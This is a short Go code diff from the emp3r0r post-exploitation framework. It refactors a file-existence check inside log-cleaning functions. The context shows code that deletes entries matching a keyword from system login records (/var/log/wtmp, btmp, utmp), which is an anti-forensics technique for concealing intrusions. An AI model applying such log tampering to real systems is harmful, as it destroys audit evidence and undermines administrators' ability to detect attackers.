@@ -5,6 +5,8 @@ import (
 	"io/ioutil"
 	"os"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // CleanAllByKeyword delete any entries containing keyword in ALL known log files
@@ -64,7 +66,7 @@ func deleteXtmpEntry(keyword string) (err error) {
 	err = nil
 	xtmpFiles := []string{"/var/log/wtmp", "/var/log/btmp", "/var/log/utmp"}
 	for _, xtmp := range xtmpFiles {
-		if IsFileExist(xtmp) {
+		if util.IsFileExist(xtmp) {
 			e := delete(xtmp)
 			if e != nil {
 				if err != nil {
